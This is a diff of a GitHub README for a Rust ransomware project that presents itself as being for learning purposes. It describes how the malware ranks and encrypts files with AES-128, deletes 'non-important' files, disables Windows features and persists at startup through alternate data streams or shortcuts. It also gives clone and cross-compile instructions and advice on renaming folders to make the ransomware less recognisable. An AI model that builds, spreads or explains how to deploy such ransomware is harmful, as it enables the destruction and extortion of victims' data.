@@ -60,7 +60,7 @@
 A ransomware type virus made for learning purposes and learning purposes only, any damage that this virus causes to your computer I don't take responsability for it.
 It sorts the files of the pc in order of importance and encrypts them using AES-128 (hasn't been cracked), the files classed as non important (such as program and games) get deleted making the encryption process quite fast.
 The ransomware also modifes the system making it more "locked down" by disabling features of windows such as control panel, run, etc.
-The ransomware injects it's self on startup using one of the methods (a. using alternate data streams | b.classic shortcut run) and resumes the process where it left off and encrypts any new file.
+The ransomware injects it's self on startup using one of the methods (a. using alternate data streams | b.classic shortcut run, check [the difference between the two](#the-difference-between-the-2-startup-options) to find more) and resumes the process where it left off and encrypts any new file.
 The ransomware can be ran even without admin and will encrypt any file it can. (you need to modify the manifest for this to remove admin)
 
 ### Built with
@@ -83,13 +83,13 @@ The ransomware can be ran even without admin and will encrypt any file it can. (
 
 ### Running The Program
 
-!!! I am not gonna give you precompiled binaries so any 7 year old can run this on their dad's computer.
+*I am not gonna give you precompiled binaries so any 7 year old can run this on their dad's computer.*
 
 1. After compling it (check [compilation](#compilation)) simply spin up a windows vm (or a real machine...), double click the exe say yes to admin and enjoy.
 
 ### Compilation
 
-This ransomware is made for windows only and will only compile for windows. The following steps require that you have rust installed, check their official [installation page](https://www.rust-lang.org/tools/install). Before going ahead and compiling I recommend that you at least look at the main.rs file in src folder and take a look at the 3 vars at the top and change them accordingly (also take a look at [the difference between the 2 startup options](#the-difference-between-the-2-startup-options)
+This ransomware is made for windows only and will only compile for windows. The following steps require that you have rust installed, check their official [installation page](https://www.rust-lang.org/tools/install). Before going ahead and compiling I recommend that you at least look at the main.rs file in src folder and take a look at the 3 vars at the top and change them accordingly (also take a look at [the difference between the 2 startup options](#the-difference-between-the-2-startup-options). Also idealy you would want to check the source code for any folder names and other stuff to make the ransomware more foreign.
 
 1.  Clone this repo on your pc, you can use "git clone", if you have git installed, like this:
 
@@ -99,10 +99,17 @@ git clone https://github.com/Obscurely/Rustsomware.git
 
 Otherwise in the right up side of the repo page you will see a download button, download the repo as zip and extract it in a folder
 
-2.  Open a new terminal/cmd window in the folder you extracted the repo in, if you can't rightclick on the folder and open it there do: "cd {the path}" and you will get there.
+2.  Open a new terminal/cmd window in the folder you extracted the repo in, if you can't rightclick on the folder and open it there do: 
+
+On Linux and windows:
+```
+cd the/path
+```
+and you will get there.
+
 3.  From there run this compile command in the terminal:
 
-On Linux:
+On Linux (this would require installing this specific toolchain, check [this](https://www.rust-lang.org/tools/install) out for more information):
 ```
 cargo build --target x86_64-pc-windows-gnu --release
 ```
